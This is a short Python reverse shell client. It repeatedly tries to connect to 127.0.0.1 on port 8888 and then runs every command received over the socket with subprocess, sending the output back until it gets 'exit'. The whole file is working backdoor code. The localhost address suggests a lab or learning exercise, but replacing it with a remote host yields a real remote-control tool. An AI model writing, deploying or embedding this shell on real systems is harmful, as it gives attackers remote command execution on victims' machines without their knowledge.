#!/usr/bin/python3

import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Tries to connect infinitely if it gets ConnectionRefusedError

print("Connecting...")
while True:
     try:
        s.connect(("127.0.0.1", 8888))
        break
     except ConnectionRefusedError:
        pass

print("Connected")

while True:
    cmd = (s.recv(1024).decode()) # encodes recieved in byte to strings
 
    if cmd == "exit":
        break

    output = subprocess.getoutput(cmd)
    s.send(output.encode())

s.close()

